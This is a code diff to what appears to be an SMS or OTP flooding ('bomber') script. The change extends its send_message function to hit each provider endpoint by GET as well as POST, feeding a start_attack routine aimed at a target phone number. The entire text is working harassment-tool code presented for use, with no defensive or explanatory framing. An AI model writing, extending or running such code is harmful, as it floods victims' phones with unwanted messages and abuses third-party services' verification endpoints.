@@ -10,18 +10,33 @@ def replace_phonenumber(phone , data="") :
 
 
 def send_message(phone, provider_name, provider_info = {} ) :
-
+    method = provider_info.get("method")
     url = provider_info.get("url")
-    parameters = provider_info.get("parameters")
 
-    try :
-        response = requests.post(url=url , json=parameters , timeout=2)
-        if response.status_code == 200 :
-            print(f"{provider_name} => Successful ;")
-        else :
-            print(f"{provider_name} => Failed ;")
-    except Exception as error :
-        print(f"{provider_name} => {error} ;")
+    if (method.lower() == "post"):
+        parameters = provider_info.get("parameters")
+
+        try :
+            response = requests.post(url=url , json=parameters , timeout=2)
+            if response.status_code == 200 :
+                print(f"{provider_name} => Successful ;")
+            else :
+                print(f"{provider_name} => Failed ;")
+        except Exception as error :
+            print(f"{provider_name} => {error} ;")
+
+    elif (method.lower() == "get") :
+        try :
+            response = requests.get(url=url , timeout=2)
+            if response.status_code == 200 :
+                print(f"{provider_name} => Successful ;")
+            else :
+                print(f"{provider_name} => Failed ;")
+        except Exception as error :
+            print(f"{provider_name} => {error} ;")
+
+    else :
+        print(f"Unknown Method")
 
 
 def start_attack (phone):
